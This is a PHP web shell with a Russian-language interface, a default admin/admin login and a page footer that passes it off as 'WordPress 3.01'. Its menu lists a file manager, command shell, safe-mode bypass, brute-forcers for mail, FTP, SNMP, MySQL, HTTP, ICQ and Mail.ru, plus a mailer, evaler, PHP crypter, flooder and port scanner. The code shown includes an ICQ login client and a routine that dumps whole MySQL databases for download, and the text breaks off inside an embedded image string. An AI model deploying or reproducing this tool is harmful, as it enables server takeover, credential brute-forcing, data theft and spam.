<?php

$log_in="admin"; $password="admin"; 
$hosts=array("*"); //Razreshennie adresa: array("nas1-86.isp.com", "213.186.11.128");

error_reporting(0);
set_time_limit(0);

ini_set("max_execution_time","0");
ini_set("memory_limit","9999M");
ini_set("output_buffering","0");
set_magic_quotes_runtime(0);
ignore_user_abort(1);
$date=date("d.m.Y");
$time_now=date("H:i");
$_REQUEST = array_merge($_GET, $_POST);
if (get_magic_quotes_gpc()){
foreach ($_REQUEST as $key=>$value)
{
$_REQUEST[$key]=stripslashes($value);
}
}
$act=$_REQUEST['act'];
$name_img=$_REQUEST['name_img'];
$dl=$_REQUEST['download'];
$img=$_REQUEST['image'];
if (!empty($_REQUEST['workingdir'])) chdir($_REQUEST['workingdir']);
$hcwd="<input type=hidden name=workingdir value=\"".getcwd()."\">";
$errorbox = "<table border=0 cellpadding=0 cellspacing=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" width=\"100%\"><tr><td><b>Ошибка: </b>";
$et = "</td></tr></table>";
$v="3.01";
$msgbox="<br><table border=0 cellpadding=0 cellspacing=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" width=\"100%\"><tr><td align=\"center\">";

$intro="<center><table border=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\"><tr><td><b>Script</b>".$et."</center>";
$footer=$msgbox."WordPress ".$v.$et;
$t = "<table border=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" width=\"40%\"><tr><td width=\"40%\">";
$crack="</td><td></td></tr><form method=\"POST\" name=form><tr><td width=\"20%\">Vocabilary</td><td><input type=text name=dictionary size=35></td></tr><tr><td width=\"20%\">Type:</td><td><input type=radio name=combo checked value=0 onClick=\"document.form.user.disabled = false;\" style=\"border-width:1px;background-color:#808080;\">Simple (P)<input type=radio value=1 name=combo onClick=\"document.form.user.disabled = true;\" style=\"border-width:1px;background-color:#808080;\">Combo (U:P)</td></tr><tr><td width=\"20%\">Name:</td><td><input type=text size=35 value=root name=user></td></tr><tr><td width=\"20%\">Сервер:</td><td><input type=text name=target value=localhost size=35></td></tr><tr><td width=\"20%\">&nbsp;</td><td align=right>".$hcwd."<input class=buttons type=submit value=Старт></td></tr></form></table></center>";
$disablefunctions = @ini_get('disable_functions');

if ($_REQUEST['sec'] == "logout") {
setcookie("user_name");
setcookie("pass_word");
header("Location: ".$_SERVER['PHP_SELF']);
exit();
}

$style="<style>
body {
scrollbar-base-color: #484848;
scrollbar-arrow-color: #FFFFFF;
scrollbar-track-color: #969696;
font-size:16px;
font-family:\"Arial Narrow\";
}

Table {
font-size: 15px;
}

.buttons {
font-family:Verdana;
font-size:10pt;
font-weight:normal;
font-style:normal;
color:#FFFFFF;
background-color:#555555;
border-style:solid;
border-width:1px;
border-color:#FFFFFF;
}

textarea {
border: 0px #000000 solid;
background: #EEEEEE;
color: #000000;
}

input {
background: #EEEEEE;
border-width:1px;
border-style:solid;
border-color:black;
}

select {
background: #EEEEEE;
border: 0px #000000 none;
}

.itemBorder { border: 1px solid black }
.itemText { text-decoration: none; color: #ffffff; font: 12px Arial, Helvetica }
.crazyBorder { border: 2px outset gray }
.crazyText { text-decoration: none; color: #ffffff; font: Bold 12px Arial, Helvetica }
</style>";

$mainmenu=$style."<script>
var isDOM = (document.getElementById ? true : false); var isIE4 = ((document.all && !isDOM) ? true : false);var isNS4 = (document.layers ? true : false);function getRef(id) {if (isDOM) return document.getElementById(id);if (isIE4) return document.all[id];if (isNS4) return document.layers[id];}function getSty(id) {return (isNS4 ? getRef(id) : getRef(id).style);} var popTimer = 0;var litNow = new Array();function popOver(menuNum, itemNum) {clearTimeout(popTimer);hideAllBut(menuNum);litNow = getTree(menuNum, itemNum);changeCol(litNow, true);targetNum = menu[menuNum][itemNum].target;if (targetNum > 0) {thisX = parseInt(menu[menuNum][0].ref.left) + parseInt(menu[menuNum][itemNum].ref.left);thisY = parseInt(menu[menuNum][0].ref.top) + parseInt(menu[menuNum][itemNum].ref.top);with (menu[targetNum][0].ref) {left = parseInt(thisX + menu[targetNum][0].x);top = parseInt(thisY + menu[targetNum][0].y);visibility = 'visible';}}}function popOut(menuNum, itemNum) {
if ((menuNum == 0) && !menu[menuNum][itemNum].target)hideAllBut(0)
else

popTimer = setTimeout('hideAllBut(0)', 500);}function getTree(menuNum, itemNum) {itemArray = new Array(menu.length);while(1) {itemArray[menuNum] = itemNum;if (menuNum == 0) return itemArray;itemNum = menu[menuNum][0].parentItem;menuNum = menu[menuNum][0].parentMenu;}}function changeCol(changeArray, isOver) {for (menuCount = 0; menuCount < changeArray.length; menuCount++) {if (changeArray[menuCount]) {newCol = isOver ? menu[menuCount][0].overCol : menu[menuCount][0].backCol;with (menu[menuCount][changeArray[menuCount]].ref) {if (isNS4) bgColor = newCol;else backgroundColor = newCol;}}}}function hideAllBut(menuNum) {var keepMenus = getTree(menuNum, 1);for (count = 0; count < menu.length; count++)if (!keepMenus[count])menu[count][0].ref.visibility = 'hidden';changeCol(litNow, false);}function Menu(isVert, popInd, x, y, width, overCol, backCol, borderClass, textClass) {this.isVert = isVert;this.popInd = popInd;this.x = x;this.y = y;this.width = width;this.overCol = overCol;this.backCol = backCol;this.borderClass = borderClass;this.textClass = textClass;this.parentMenu = null;this.parentItem = null;this.ref = null;}function Item(text, href, frame, length, spacing, target) {this.text = text;this.href = href;this.frame = frame;this.length = length;this.spacing = spacing;this.target = target;this.ref = null;}function writeMenus() {if (!isDOM && !isIE4 && !isNS4) return;for (currMenu = 0; currMenu < menu.length; currMenu++) with (menu[currMenu][0]) {var str = '', itemX = 0, itemY = 0;for (currItem = 1; currItem < menu[currMenu].length; currItem++) with (menu[currMenu][currItem]) {var itemID = 'menu' + currMenu + 'item' + currItem;var w = (isVert ? width : length);var h = (isVert ? length : width);if (isDOM || isIE4) {str += '<div id=\"' + itemID + '\" style=\"position: absolute; left: ' + itemX + '; top: ' + itemY + '; width: ' + w + '; height: ' + h + '; visibility: inherit; ';if (backCol) str += 'background: ' + backCol + '; ';str += '\" ';}if (isNS4) {str += '<layer id=\"' + itemID + '\" left=\"' + itemX + '\" top=\"' + itemY + '\" width=\"' +  w + '\" height=\"' + h + '\" visibility=\"inherit\" ';if (backCol) str += 'bgcolor=\"' + backCol + '\" ';}if (borderClass) str += 'class=\"' + borderClass + '\" ';str += 'onMouseOver=\"popOver(' + currMenu + ',' + currItem + ')\" onMouseOut=\"popOut(' + currMenu + ',' + currItem + ')\">';str += '<table width=\"' + (w - 8) + '\" border=\"0\" cellspacing=\"0\" cellpadding=\"' + (!isNS4 && borderClass ? 3 : 0) + '\"><tr><td align=\"left\" height=\"' + (h - 7) + '\">' + '<a class=\"' + textClass + '\" href=\"' + href + '\"' + (frame ? ' target=\"' + frame + '\">' : '>') + text + '</a></td>';if (target > 0) {menu[target][0].parentMenu = currMenu;menu[target][0].parentItem = currItem;if (popInd) str += '<td class=\"' + textClass + '\" align=\"right\">' + popInd + '</td>';}str += '</tr></table>' + (isNS4 ? '</layer>' : '</div>');if (isVert) itemY += length + spacing;else itemX += length + spacing;}if (isDOM) {var newDiv = document.createElement('div');document.getElementsByTagName('body').item(0).appendChild(newDiv);newDiv.innerHTML = str;ref = newDiv.style;ref.position = 'absolute';ref.visibility = 'hidden';}if (isIE4) {document.body.insertAdjacentHTML('beforeEnd', '<div id=\"menu' + currMenu + 'div\" ' + 'style=\"position: absolute; visibility: hidden\">' + str + '</div>');ref = getSty('menu' + currMenu + 'div');}if (isNS4) {ref = new Layer(0);ref.document.write(str);ref.document.close();}for (currItem = 1; currItem < menu[currMenu].length; currItem++) {itemName = 'menu' + currMenu + 'item' + currItem;if (isDOM || isIE4) menu[currMenu][currItem].ref = getSty(itemName);if (isNS4) menu[currMenu][currItem].ref = ref.document[itemName];}}with(menu[0][0]) {ref.left = x;ref.top = y;ref.visibility = 'visible';}}var menu = new Array();var defOver = 'gray', defBack = 'gray';var defLength = 22;menu[0] = new Array();menu[0][0] = new Menu(false, '', 5, 0, 17, 'gray', 'gray', '', 'itemText');menu[0][1] = new Item('Назад','javascript:history.back(1)', '', 90, 10, 0);menu[0][2] = new Item('PHPINFO','".hlink("sec=phpinfo")."', '', 90, 10, 0);menu[0][3] = new Item('Инфо','"; $cwd=str_replace("\\","\\\\",getcwd()); $mainmenu.=hlink("sec=sysinfo&workingdir=$cwd"); $mainmenu.="', '', 90, 10, 0);menu[0][4] = new Item('Файлы','".hlink("sec=fm&workingdir=$cwd")."', '', 90, 10, 1);menu[0][5] = new Item('Брут','".hlink("sec=cr&workingdir=$cwd")."', '', 90, 10, 2);menu[0][6] = new Item('Утилиты','".hlink("sec=tools&workingdir=$cwd")."', '', 90, 10, 3);menu[0][7] = new Item('Прокси','".hlink("sec=px&workingdir=$cwd")."', '', 90, 10, 0);menu[0][8] = new Item('О скрипте','".hlink("sec=about&workingdir=$cwd")."', '', 90, 10, 0);menu[0][9] = new Item('Выход','".hlink("sec=logout")."', '', 90, 10, 0);menu[1] = new Array();menu[1][0] = new Menu(true, '>', 0, 22, 150, defOver, defBack, 'itemBorder', 'itemText');menu[1][1] = new Item('Редактор','".hlink("sec=edit&workingdir=$cwd")."', '', defLength, 0, 0);menu[1][2] = new Item('WebShell','".hlink("sec=webshell&workingdir=$cwd")."', '', defLength, 0, 0);menu[1][3] = new Item('AntiSafe mode','".hlink("sec=asm&workingdir=$cwd")."', '', defLength, 0, 0);menu[2] = new Array();menu[2][0] = new Menu(true, '>', 0, 22, 150, defOver, defBack, 'itemBorder', 'itemText');menu[2][1] = new Item('Hash','".hlink("sec=hc&workingdir=$cwd")."', '', defLength, 0, 0);menu[2][2] = new Item('SMTP','".hlink("sec=smtp&workingdir=$cwd")."', '', defLength, 0, 0);menu[2][3] = new Item('POP3','".hlink("sec=pop3&workingdir=$cwd")."', '', defLength, 0, 0);menu[2][4] = new Item('IMAP','".hlink("sec=imap&workingdir=$cwd")."', '', defLength, 0, 0);menu[2][5] = new Item('FTP','".hlink("sec=ftp&workingdir=$cwd")."', '', defLength, 0, 0);menu[2][6] = new Item('SNMP','".hlink("sec=snmp&workingdir=$cwd")."', '', defLength, 0, 0);menu[2][7] = new Item('MySQL','".hlink("sec=sql&workingdir=$cwd")."', '', defLength, 0, 0);menu[2][8] = new Item('HTTP форма','".hlink("sec=fcr&workingdir=$cwd")."', '', defLength, 0, 0);menu[2][9] = new Item('HTTP авторизация','".hlink("sec=auth&workingdir=$cwd")."', '', defLength, 0, 0);menu[2][10] = new Item('Coder','".hlink("sec=code&workingdir=$cwd")."', '', defLength, 0, 0);menu[2][11] = new Item('ICQ брут','".hlink("sec=icq&workingdir=$cwd")."', '', defLength, 0, 0);menu[2][12] = new Item('MRA брут','".hlink("sec=mbr&workingdir=$cwd")."', '', defLength, 0, 0);menu[2][13] = new Item('Генератор словарей','".hlink("sec=dic&workingdir=$cwd")."', '', defLength, 0, 0);menu[3] = new Array();menu[3][0] = new Menu(true, '>', 0, 22, 150, defOver, defBack, 'itemBorder', 'itemText');menu[3][1] = new Item('InetCrack','".hlink("sec=http&workingdir=$cwd")."', '', defLength, 0, 0);menu[3][2] = new Item('Файловый флудер','".hlink("sec=fflooder&workingdir=$cwd")."', '', defLength, 0, 0);menu[3][3] = new Item('Прокси-чекер','".hlink("sec=prc&workingdir=$cwd")."', '', defLength, 0, 0);menu[3][4] = new Item('WhoIs','".hlink("sec=whois&workingdir=$cwd")."', '', defLength, 0, 0);menu[3][5] = new Item('PHP Криптор','".hlink("sec=cryptphp&workingdir=$cwd")."', '', defLength, 0, 0);menu[3][6] = new Item('Converter','".hlink("sec=calc&workingdir=$cwd")."', '', defLength, 0, 0);menu[3][7] = new Item('Hash Calc','".hlink("sec=hash&workingdir=$cwd")."', '', defLength, 0, 0);menu[3][8] = new Item('SQL','".hlink("sec=mysql&workingdir=$cwd")."', '', defLength, 0, 0);menu[3][9] = new Item('Мейлер','".hlink("sec=mailer&workingdir=$cwd")."', '', defLength, 0, 0);menu[3][10] = new Item('Evaler','".hlink("sec=eval&workingdir=$cwd")."', '', defLength, 0, 0);menu[3][11] = new Item('Сканеры','".hlink("sec=sc&workingdir=$cwd")."', '', defLength, 0, 0);menu[3][12] = new Item('Самоудаление','".hlink("sec=selfremove&workingdir=.")."', '', defLength, 0, 0);var popOldWidth = window.innerWidth;nsResizeHandler = new Function('if (popOldWidth != window.innerWidth) location.reload()');if (isNS4) document.captureEvents(Event.CLICK);document.onclick = clickHandle;function clickHandle(evt){if (isNS4) document.routeEvent(evt);hideAllBut(0);}function moveRoot(){with(menu[0][0].ref) left = ((parseInt(left) < 100) ? 100 : 5);}

</script>";

$tmp=array();
foreach ($hosts as $k=>$v)
$tmp[]=str_replace("\\*",".*",preg_quote($v));
$ssd="!^(".implode("|",$tmp).")$!i";
if (!preg_match($ssd,getenv("REMOTE_ADDR")) && !preg_match($ssd,gethostbyaddr(getenv("REMOTE_ADDR")))) {
die("<html>
<head>
".$style."

<title>Not found</title>
</head>
<body text=\"#ffffff\" bgcolor=\"#181818\" link=\"#DCDCDC\" vlink=\"#DCDCDC\" alink=\"#DCDCDC\" onLoad=\"writeMenus()\" onResize=\"if (isNS4) nsResizeHandler()\">
<center><br><h1>Sorry</h1><br><h1>Access denied from your IP</h1></center>
</body></html>");
}

$loginlogin=array_merge($_COOKIE,$_POST);
if ($log_in != false) {
if ($loginlogin['user_name'] != $log_in || $loginlogin['pass_word'] != $password) {
die("<html>
<head>

".$style."

<title>Not found</title>
</head>
<body text=\"#ffffff\" bgcolor=\"#181818\" link=\"#DCDCDC\" vlink=\"#DCDCDC\" alink=\"#DCDCDC\" onLoad=\"writeMenus()\" onResize=\"if (isNS4) nsResizeHandler()\">
<center><br><h1>Authorization</h1><br>
<form action=\"".$_SERVER['PHP_SELF']."\" method=post>
Login:<br><input type=text name=user_name><br><br>
Password:<br><input type=password name=pass_word><br><br>
<input type=submit value=\"Log in\">
</form>
</center>
</body></html>");
} else {

if (!$_COOKIE['user_name']) {
setcookie("user_name",$log_in);
setcookie("pass_word",$password);
}}}

function get_file_ext($file) {
$file=strtolower($file);
if (strstr($file,".")) {
$d=strlen($file);
$ext="";
while($file[$d]!=".") {
$ext=$file[$d].$ext; $d--; }
return $ext;
} else {

return $file;
}

}

if ($act == "img") {
unset($img);
$img=array(
'dir'=>
'R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA'.
'AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp'.
'/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs=',
'exe'=>
'R0lGODlhEwAOAKIAAAAAAP///wAAvcbGxoSEhP///wAAAAAAACH5BAEAAAUALAAAAAATAA4AAAM7'.
'WLTcTiWSQautBEQ1hP+gl21TKAQAio7S8LxaG8x0PbOcrQf4tNu9wa8WHNKKRl4sl+y9YBuAdEqt'.
'xhIAOw==',
'html'=>
'R0lGODlhEwAQALMAAAAAAP///2trnM3P/FBVhrPO9l6Itoyt0yhgk+Xy/WGp4sXl/i6Z4mfd/HNz'.
'c////yH5BAEAAA8ALAAAAAATABAAAAST8Ml3qq1m6nmC/4GhbFoXJEO1CANDSociGkbACHi20U3P'.
'KIFGIjAQODSiBWO5NAxRRmTggDgkmM7E6iipHZYKBVNQSBSikukSwW4jymcupYFgIBqL/MK8KBDk'.
'Bkx2BXWDfX8TDDaFDA0KBAd9fnIKHXYIBJgHBQOHcg+VCikVA5wLpYgbBKurDqysnxMOs7S1sxIR'.
'ADs=',
'txt'=>

'R0lGODlhEwAQAKIAAAAAAP///8bGxoSEhP///wAAAAAAAAAAACH5BAEAAAQALAAAAAATABAAAANJ'.
'SArE3lDJFka91rKpA/DgJ3JBaZ6lsCkW6qqkB4jzF8BS6544W9ZAW4+g26VWxF9wdowZmznlEup7'.
'UpPWG3Ig6Hq/XmRjuZwkAAA7',
'unk'=>

'R0lGODlhEwAQAKIAAAAAAP///8bGxoSEhP///wAAAAAAAAAAACH5BAEAAAQALAAAAAATABAAAANE'.
'SLPcSzCqQKsVQ8JhexBBJnGVYFZACowleJZrRH7lFW8eDbMXaPO1juA2uXiGwBwFKRMeiTPlByrd'.
'yUzYbJao6npVkQQAOw==',
'php'=>

'R0lGODlhEwAQALMAAAAAAP///9fX3d3f7s/S5F1qpmJpjKOqyr7D27i80K+ywEtam4OIk+T/AO7u'.
'7v///yH5BAEAAA8ALAAAAAATABAAAAR08D0wK71VSna47yBHadxhnujRqKRJvC+SJIPKbgJR7DzP'.
'NECNgNFbGI/HhmZQWASezugzsFBKdtJsoEA1aLBTJzTMIDWpRqr6mFgyounswiAgDYjY/FwxGD1K'.
'BAMIg4MJCg41fiUpjAeKjY1+EwCUlZaVGhEAOw==',
'img'=>

'R0lGODlhEwAQALMAAAAAAP///6CgpHFzcVe2Osz/mbPmZkRmAPj4+Nra2szMzLKyspeXl4aGhlVV'.
'Vf///yH5BAEAAA8ALAAAAAATABAAAASA8KFJq00vozZ6Z4uSjGOTSV3DMFzTCGJ5boIQKsrqgoqp'.
'qbabYsFq+SSs1WLJFLgGx82OUWMuXVEPdGcLOmcehziVtEXFjoHiQGCnV99fR4EgFA6DBVQ3c3bq'.
'BIEBAXtRSwIsCwYGgwEJAywzOCGHOliRGjiam5M4RwlYoaJPGREAOw=='
);

header("Content-type: image/gif");
die (base64_decode($img[$name_img]));
}

class ICQclient
{

var $socket, $server, $port, $connected;
var $uin, $password, $logged;
var $client = array(), $sequence, $TLV = array();
var $uin_sendto, $message;
function ICQclient($uin, $password)
{

$this->server = "login.icq.com";
$this->port = 5190;
$this->uin = (string)$uin;
$this->password = $password;
$this->client = array("name" => "qip", "country" => "ru", "language" => "ru", "major" => 1, "minor" => 0, "lesser" => 0, "build" => 1);
}

function connect()

{

$this->socket = @fsockopen($this->server, $this->port);
if (!$this->socket) return false;
else {
$this->connected = true;
return true;
}
}

function connect_migration()
{

list($server, $port) = explode(":", $this->TLV[0x05]);
$this->socket = @fsockopen($server, $port);
}

function login()
{

if (!$this->connected) $this->connect();
if (!$this->connected) return false;
$this->receive_packet();
$this->sequence = rand(0x0000, 0xFFFF);
$this->send_packet("login");
$SNAC = $this->receive_packet();
$this->parse_SNAC($SNAC);
if (!(@$this->TLV[0x05] and @$this->TLV[0x06])) return false;
$this->connect_migration();
$this->send_packet("cookie");
$this->receive_packet();
$this->send_packet("ready");
$this->receive_packet();
$this->logged = true;
return true;
}

function send_message($uin, $message)
{
if (!$this->logged) return false;
$this->uin_sendto = $uin;
$this->message = $message;
$this->send_packet("message");
$this->receive_packet();
return true;
}

function send_packet($type)
{

list($channel, $SNAC) = $this->gen_SNAC($type);
$FLAP = pack("CCnn", 0x2A, $channel, $this->sequence, strlen($SNAC));
$packet = $FLAP.$SNAC;
@fwrite($this->socket, $packet);
$this->sequence++;
if ($this->sequence == 0xFFFF) $this->sequence = 0x0000;
}

function receive_packet()
{

$FLAP = @fread($this->socket, 6);
list(, $length) = @unpack("n", substr($FLAP, 4, 2));
$SNAC = @fread($this->socket, $length);
$packet = $FLAP.$SNAC;
return $SNAC;
}

function gen_SNAC($type)
{

if ($type == "login") {
$SNAC =
pack("N", 1).
$this->gen_TLV(0x01, $this->uin).
$this->gen_TLV(0x02, xor_encrypt($this->password)).
$this->gen_TLV(0x03, $this->client["name"]).
$this->gen_TLV(0x16, 266, 2).
$this->gen_TLV(0x17, $this->client["major"], 2).
$this->gen_TLV(0x18, $this->client["minor"], 2).
$this->gen_TLV(0x19, $this->client["lesser"], 2).
$this->gen_TLV(0x1A, $this->client["build"], 2).
$this->gen_TLV(0x14, 85, 4).
$this->gen_TLV(0x0F, $this->client["language"]).
$this->gen_TLV(0x0E, $this->client["country"]);
$channel = 1;
}

if ($type == "cookie") {
$SNAC =
pack("N", 1).
$this->gen_TLV(0x06, $this->TLV[0x06]);
$channel = 1;
}

if ($type == "ready") {
$SNAC =
"\x00\x01\x00\x02\x00\x00\x00\x00\x00\x02\x00\x01\x00\x03\x01\x10".
"\x02\x8A\x00\x02\x00\x01\x01\x01\x02\x8A\x00\x03\x00\x01\x01\x10". 
"\x02\x8A\x00\x15\x00\x01\x01\x10\x02\x8A\x00\x04\x00\x01\x01\x10". 
"\x02\x8A\x00\x06\x00\x01\x01\x10\x02\x8A\x00\x09\x00\x01\x01\x10". 
"\x02\x8A\x00\x0A\x00\x01\x01\x10\x02\x8A";
$channel = 2;
}

if ($type == "message") {
$this->TLV[0x0501] = pack("C", 1);
$this->TLV[0x0101] = pack("N", 0).$this->message;
$this->TLV[0x02] =
$this->gen_TLV(0x0501, $this->TLV[0x0501]).
$this->gen_TLV(0x0101, $this->TLV[0x0101]);
$SNAC =
pack("nnnNdnca*", 0x04, 0x06, 0, 0, microtime(), 1, strlen($this->uin_sendto), $this->uin_sendto).
$this->gen_TLV(0x02, $this->TLV[0x02]).
$this->gen_TLV(0x06, "");
$channel = 2;
}

return array($channel, $SNAC);
}

function parse_SNAC($SNAC)
{

unset($this->TLV);
while (strlen($SNAC) > 0) {
list(, $type, $length) = unpack("n2", substr($SNAC, 0, 4));
$this->TLV[$type] = substr($SNAC, 4, $length);
$SNAC = substr($SNAC, 4+$length);
}
}

function gen_TLV($type, $value, $length=false)
{

switch ($length) {
case 1: $format = "C"; break;
case 2: $format = "n"; break;
case 4: $format = "N"; break;
default: $format = "a*"; break;
}

if ($length === false) $length = strlen($value); 
return pack("nn".$format, $type, $length, $value);
}
}

function xor_encrypt($password)
{
$roast = "\xf3\x26\x81\xc4\x39\x86\xdb\x92\x71\xa3\xb9\xe6\x53\x7a\x95\x7c";
$xored = "";
for ($i=0; $i<strlen($password); $i++) $xored .= chr(ord($roast[$i]) ^ ord($password[$i]));
return $xored;
}

function hlink($str="") {
$ret = $_SERVER['PHP_SELF']."?";
return $ret.$str;
}

function checkthisport($ip,$port,$timeout){
$scan=fsockopen($ip,$port,$n,$s,$timeout);
if($scan) { fclose($scan); return 1; }
return 0;
}

if ($_REQUEST['sec']=='mysql') {
function strips(&$el) { 
if (is_array($el)) { 
foreach($el as $k=>$v) { 
if($k!='GLOBALS') { 
strips($el[$k]); 
} 
} 

} else { 
$el = stripslashes($el); 
} 
}

function download($file, $type = false, $name = false, $down = false) { 
if(!file_exists($file)) exit; 
if(!$name) $name = basename($file); 
if($down) $type = "application/force-download"; 
else if(!$type) $type = "application/download"; 
$disp = $down ? "attachment" : "inline";
header("Content-disposition: ".$disp."; filename=".$name); 
header("Content-length: ".filesize($file)); 
header("Content-type: ".$type); 
header("Connection: close"); 
header("Expires: 0");
set_time_limit(0); 
readfile($file); 
unlink($file);
exit; 
}

function send_header() {
header("Content-type: image/gif");
header("Cache-control: public");
header("Expires: ".date("r",mktime(0,0,0,1,1,2030)));
header("Cache-control: max-age=".(60*60*24*7));
header("Last-Modified: ".date("r",filemtime(__FILE__)));
}

$self=$HTTP_SERVER_VARS['PHP_SELF'];
if(!ini_get("register_globals")){ 
import_request_variables("GPC"); 
}

if (get_magic_quotes_gpc()) strips($GLOBALS);
if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
$file = "C:\\dump_".$db.".sql";
$p_v=$SystemRoot."\my.ini";
$os="win";
} else {

$file = "/tmp/dump_".$db.".sql"; 
$p_v="/etc/passwd";
}

if ($_REQUEST['send']=='send_http') {
if ($_REQUEST['strukt']=='d_strukt_bd' && $_REQUEST['dump']=='bd'){
$host = $HTTP_SERVER_VARS["SERVER_NAME"];
$ip = $HTTP_SERVER_VARS["SERVER_ADDR"];
$connection=mysql_connect($server.":".$port, $login, $passwd) or die("$h_error<b>".mysql_error()."</b>$f_error");
mysql_select_db($db) or die("$h_error<b>".mysql_error()."</b>$f_error");
if (sizeof($tabs) == 0) { 
$res = mysql_query("SHOW TABLES FROM $db", $connection); 
if (mysql_num_rows($res) > 0) { 
while ($row = mysql_fetch_row($res)) { 
$tabs[] .= $row[0]; 
} 
} 
} 

$fp = fopen($file, "w"); 
fputs ($fp, "# Host settings:\n# MySQL version: (".mysql_get_server_info().")\n# Date: ".
date("F j, Y, g:i a")."\n# ".$host." (".$ip.")"." dump db \"".$db."\"\n#____________________________________________________________\n\n"); 
foreach($tabs as $tab) {       
if ($add_drop) { 
fputs($fp, "DROP TABLE IF EXISTS `".$tab."`;\n");
}        

$res = mysql_query("SHOW CREATE TABLE `".$tab."`", $connection) or die(mysql_error()); 
$row = mysql_fetch_row($res); 
fputs($fp, $row[1].";\n\n"); 
$res = mysql_query("SELECT * FROM `$tab`", $connection); 
if (mysql_num_rows($res) > 0) { 
while ($row = mysql_fetch_assoc($res)) { 
$keys = implode("`, `", array_keys($row)); 
$values = array_values($row); 
foreach($values as $k=>$v) {$values[$k] = addslashes($v);} 
$values = implode("', '", $values); 
$sql = "INSERT INTO `$tab`(`".$keys."`) VALUES ('".$values."');\n"; 
fputs($fp, $sql); 
} 
} 
fputs ($fp, "#---------------------------------------------------------------------------------\n\n"); 
} 

fclose($fp);
}

if ($_REQUEST['strukt']=='d_strukt'){
$host = $HTTP_SERVER_VARS["SERVER_NAME"];
$ip = $HTTP_SERVER_VARS["SERVER_ADDR"];
$connection=mysql_connect($server.":".$port, $login, $passwd) or die("$h_error<b>".mysql_error()."</b>$f_error");
mysql_select_db($db) or die("$h_error<b>".mysql_error()."</b>$f_error");
$fp = fopen($file, "w"); 
fputs ($fp, "# Host settings:\n# $host ($ip)\n# MySQL version: (".mysql_get_server_info().")\n# Date: ".
date("F j, Y, g:i a")."\n# "." dump db \"".$db."\" table \"".$tbl."\"\n#_________________________________________________________\n\n"); 
$res = mysql_query("SHOW CREATE TABLE `".$tbl."`", $connection) or die("$h_error<b>".mysql_error()."</b>$f_error"); 
$row = mysql_fetch_row($res); 
fputs($fp, "DROP TABLE IF EXISTS `".$tbl."`;\n");
fputs($fp, $row[1].";\n\n");        
$res = mysql_query("SELECT * FROM `$tbl`", $connection); 
if (mysql_num_rows($res) > 0) { 
while ($row = mysql_fetch_assoc($res)) { 
$keys = implode("`, `", array_keys($row)); 
$values = array_values($row); 
foreach($values as $k=>$v) {$values[$k] = addslashes($v);} 
$values = implode("', '", $values); 
$sql = "INSERT INTO `$tbl`(`".$keys."`) VALUES ('".$values."');\n"; 
fputs($fp, $sql); 
} 
}
fclose($fp); 
}

if ($_REQUEST['strukt']=='t_strukt'){
$host = $HTTP_SERVER_VARS["SERVER_NAME"];
$ip = $HTTP_SERVER_VARS["SERVER_ADDR"];
$connection=mysql_connect($server.":".$port, $login, $passwd) or die("$h_error<b>".mysql_error()."</b>$f_error");
mysql_select_db($db) or die("$h_error<b>".mysql_error()."</b>$f_error");
$fp = fopen($file, "w"); 
fputs ($fp, "# Host settings:\n# $host ($ip)\n# MySQL version: (".mysql_get_server_info().")\n# Date: ".
date("F j, Y, g:i a")."\n# "." dump db \"".$db."\" table \"".$tbl."\"\n#_________________________________________________________\n\n"); 
$res = mysql_query("SHOW CREATE TABLE `".$tbl."`", $connection) or die("$h_error<b>".mysql_error()."</b>$f_error"); 
$row = mysql_fetch_row($res); 
fputs($fp, "DROP TABLE IF EXISTS `".$tbl."`;\n");
fputs($fp, $row[1].";\n\n");   
fclose($fp);
}

if ($_REQUEST['strukt']=='d'){
$host = $HTTP_SERVER_VARS["SERVER_NAME"];
$ip = $HTTP_SERVER_VARS["SERVER_ADDR"];
$connection=mysql_connect($server.":".$port, $login, $passwd) or die("$h_error<b>".mysql_error()."</b>$f_error");
mysql_select_db($db) or die("$h_error<b>".mysql_error()."</b>$f_error");
$fp = fopen($file, "w"); 
$res = mysql_query("SELECT * FROM `$tbl`", $connection); 
if (mysql_num_rows($res) > 0) { 
while ($row = mysql_fetch_assoc($res)) { 
$keys = implode("`, `", array_keys($row)); 
$values = array_values($row); 
foreach($values as $k=>$v) {$values[$k] = addslashes($v);} 
$values = implode("', '", $values); 
$sql = "INSERT INTO `$tbl`(`".$keys."`) VALUES ('".$values."');\n"; 
fputs($fp, $sql); 
} 
} 

fclose($fp); 
}

download($f_dump);
}

if ($_REQUEST['img']=='b_close') {
$b_close='R0lGODlhdwAUAOYAANWEhdJYWNiwsc0PD9aTk88sLNA7O9rNztehotR1dk0AANQnJ4IAANc1Ndg9PWYAAL4'.
'AAM8PD6AAANg8POiLi8yEhb0sLIYAAGIAAMRYWOeGhtc5Oc8NDeR3d1gAANuEhU4AAKcAANJbW9Z1dt1XV8'.
'IAAONzc8QAAOqXl6gAAO2kpOJvb9IeHtuOj88QENYwMHUAANASEt9hYbAAAIwAAHkAAD0AAL0AAN5aWtQpK'.
'c4MDNROT0UAAKwAANtJSdQqKtAUFOqYmMwCAuR2dtuiou2jo95bW8l1dtc3N+ucnI4AAJMAAHoAAD4AANWK'.
'i+yfn5IAAOuZmdaVls4KCtlAQJQAAEAAANtMTOFra3EAAJEAALgAAOFpaWcAAOeFhXAAAN9dXeqVlTcAANg'.
'6Ol4AANNnZ9m/wLUAANEbG9tKSoQAAOiOjuaCglYAAOJsbDQAANvc3cwAAAAAAAAAAAAAAAAAAAAAAAAAAA'.
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAAAAAAALAAAAAB3ABQAAAf/gFFFKk9ha4eIiYqLjI2Oj5CRk'.
'pOJGiY4GxwUQUkoFGygoaKjpKWmp6ipqqusokNGSBwzHV4UGh1uubq7vL2+v8DBwsPExbtgYy5nSjJYK1wk'.
'adLT1NXW19jZ2tvc1h8tRB/d2BsxW0tZPldpVD9o7/Dx8vP09fb3+PnxO3D9cCP66k05UwWGBwcTGiyIEKe'.
